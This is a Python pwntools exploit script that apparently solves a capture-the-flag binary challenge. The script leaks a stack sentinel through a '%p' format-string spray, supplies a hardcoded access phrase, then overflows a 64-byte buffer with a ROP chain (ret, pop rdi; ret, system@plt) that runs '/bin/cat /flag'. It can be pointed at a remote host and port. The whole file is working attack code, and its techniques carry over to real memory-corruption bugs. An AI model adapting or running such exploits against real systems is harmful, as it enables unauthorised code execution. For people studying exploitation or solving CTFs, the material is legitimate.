#!/usr/bin/env python3
import sys
import re
from pwn import process, remote, ELF, p64, p32, context

SECRET_PHRASE = "RED_PILL_BLUE_PILL"
BINARY_PATH = "./challenge"

context.log_level = "info"
context.arch = "amd64"

LEAK_SPRAY_COUNT = 30
SENTINEL_PREFIX = 0xDEAD0000
SENTINEL_MASK = 0xFFFF0000


def get_addresses(path):
    elf = ELF(path)

    system_plt = elf.plt.get("system")
    if not system_plt:
        print("[-] system@plt not found!")
        sys.exit(1)

    binary_data = open(path, "rb").read()
    needle = b"/bin/cat /flag"
    offset = binary_data.find(needle)
    if offset == -1:
        print("[-] Shell command string not found in binary!")
        sys.exit(1)

    shell_cmd_addr = None
    for seg in elf.segments:
        if seg.header.p_type == "PT_LOAD":
            seg_start = seg.header.p_offset
            seg_end = seg_start + seg.header.p_filesz
            if seg_start <= offset < seg_end:
                shell_cmd_addr = seg.header.p_vaddr + (offset - seg_start)
                break

    if not shell_cmd_addr:
        print("[-] Could not resolve virtual address of shell command string!")
        sys.exit(1)

    pop_rdi_ret = None
    for i in range(len(binary_data) - 1):
        if binary_data[i] == 0x5f and binary_data[i + 1] == 0xc3:
            for seg in elf.segments:
                if seg.header.p_type == "PT_LOAD" and seg.header.p_flags & 1:
                    seg_start = seg.header.p_offset
                    seg_end = seg_start + seg.header.p_filesz
                    if seg_start <= i < seg_end:
                        pop_rdi_ret = seg.header.p_vaddr + (i - seg_start)
                        break
            if pop_rdi_ret:
                break

    ret_gadget = None
    for i in range(len(binary_data)):
        if binary_data[i] == 0xc3:
            for seg in elf.segments:
                if seg.header.p_type == "PT_LOAD" and seg.header.p_flags & 1:
                    seg_start = seg.header.p_offset
                    seg_end = seg_start + seg.header.p_filesz
                    if seg_start <= i < seg_end:
                        ret_gadget = seg.header.p_vaddr + (i - seg_start)
                        break
            if ret_gadget:
                break

    if not pop_rdi_ret:
        print("[-] pop rdi; ret gadget not found!")
        sys.exit(1)

    print(f"[+] system@plt:       {hex(system_plt)}")
    print(f"[+] \"/bin/cat /flag\": {hex(shell_cmd_addr)}")
    print(f"[+] pop rdi; ret:     {hex(pop_rdi_ret)}")
    print(f"[+] ret (alignment):  {hex(ret_gadget)}")

    return system_plt, shell_cmd_addr, pop_rdi_ret, ret_gadget


def leak_sentinel(io):
    print("[*] Leaking sentinel via format string...")

    io.recvuntil(b"Choice:")
    io.sendline(b"3")
    io.recvuntil(b"Signal:")

    payload = ".".join(["%p"] * LEAK_SPRAY_COUNT)
    io.sendline(payload.encode())

    resp = io.recvuntil(b"Choice:", timeout=5)
    resp_str = resp.decode(errors="replace")

    leaked_values = re.findall(r"0x[0-9a-fA-F]+", resp_str)
    sentinel = None

    for val_str in leaked_values:
        try:
            val = int(val_str, 16)
            upper = (val >> 32) & 0xFFFFFFFF
            if (upper & SENTINEL_MASK) == SENTINEL_PREFIX and upper != SENTINEL_PREFIX:
                sentinel = upper
                print(f"[+] Leaked sentinel: {hex(sentinel)}")
                break
            if (val & SENTINEL_MASK) == SENTINEL_PREFIX and val != SENTINEL_PREFIX and val < 0x100000000:
                sentinel = val
                print(f"[+] Leaked sentinel: {hex(sentinel)}")
                break
        except ValueError:
            continue

    if sentinel is None:
        print("[-] Could not leak sentinel! Trying wider spray...")
        io.sendline(b"3")
        io.recvuntil(b"Signal:")
        payload2 = ".".join(["%p"] * 50)
        io.sendline(payload2.encode())
        resp2 = io.recvuntil(b"Choice:", timeout=5).decode(errors="replace")
        for val_str in re.findall(r"0x[0-9a-fA-F]+", resp2):
            try:
                val = int(val_str, 16)
                upper = (val >> 32) & 0xFFFFFFFF
                if (upper & SENTINEL_MASK) == SENTINEL_PREFIX and upper != SENTINEL_PREFIX:
                    sentinel = upper
                    print(f"[+] Leaked sentinel (2nd attempt): {hex(sentinel)}")
                    break
            except ValueError:
                continue

    if sentinel is None:
        print("[-] Failed to leak sentinel value!")
        sentinel = 0xDEAD1337

    return sentinel


def main():
    system_plt, shell_cmd_addr, pop_rdi_ret, ret_gadget = get_addresses(BINARY_PATH)

    if len(sys.argv) >= 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        io = process(BINARY_PATH)

    sentinel = leak_sentinel(io)

    io.sendline(b"31337")
    io.recvuntil(b"Enter access phrase:")
    io.sendline(SECRET_PHRASE.encode())

    resp = io.recvuntil(b"Choice:", timeout=3)
    if b"ACCESS GRANTED" not in resp:
        print("[-] Access denied -- wrong phrase for this build.")
        print(resp.decode(errors="replace"))
        io.close()
        return

    print("[+] Access granted, inside Morpheus Console")

    io.sendline(b"2")
    io.recvuntil(b">")

    BUFFER_SIZE = 64
    PADDING_TO_SENTINEL = 12

    payload = b"A" * BUFFER_SIZE
    payload += b"B" * PADDING_TO_SENTINEL
    payload += p32(sentinel)
    payload += b"D" * 8
    payload += p64(ret_gadget)
    payload += p64(pop_rdi_ret)
    payload += p64(shell_cmd_addr)
    payload += p64(system_plt)

    io.sendline(payload)

    output = io.recvall(timeout=5).decode(errors="replace")
    print(output)

    match = re.search(r"(flag\{[^}]+\}|CTF\{[^}]+\}|warCTF\{[^}]+\})", output, re.IGNORECASE)
    if match:
        print(f"\n[+] FLAG: {match.group(0)}")
    else:
        print("\n[-] Flag pattern not found in output.")

    io.close()


if __name__ == "__main__":
    main()
